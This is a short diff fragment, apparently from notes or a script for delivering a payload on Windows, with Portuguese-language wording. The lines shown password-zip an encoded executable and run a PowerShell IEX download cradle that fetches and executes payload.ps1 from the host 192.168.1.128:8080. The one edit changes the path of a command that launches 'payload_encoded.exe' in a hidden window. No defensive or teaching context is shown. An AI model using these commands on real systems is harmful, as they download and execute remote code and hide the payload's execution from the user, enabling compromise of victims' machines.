@@ -17,5 +17,5 @@ zip --password SuaSenhaForte payload_protegido.zip payload_encoded.exe
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.128:8080/payload.ps1')
 
 
-powershell.exe -windowstyle hidden -Command "Start-Process 'C:\Users\rsilva\Desktop\VTBI\payload_encoded.exe'"
+powershell.exe -WindowStyle hidden -Command "Start-Process 'C:\Users\rsilva\Downloads\payload_encoded.exe'"
 
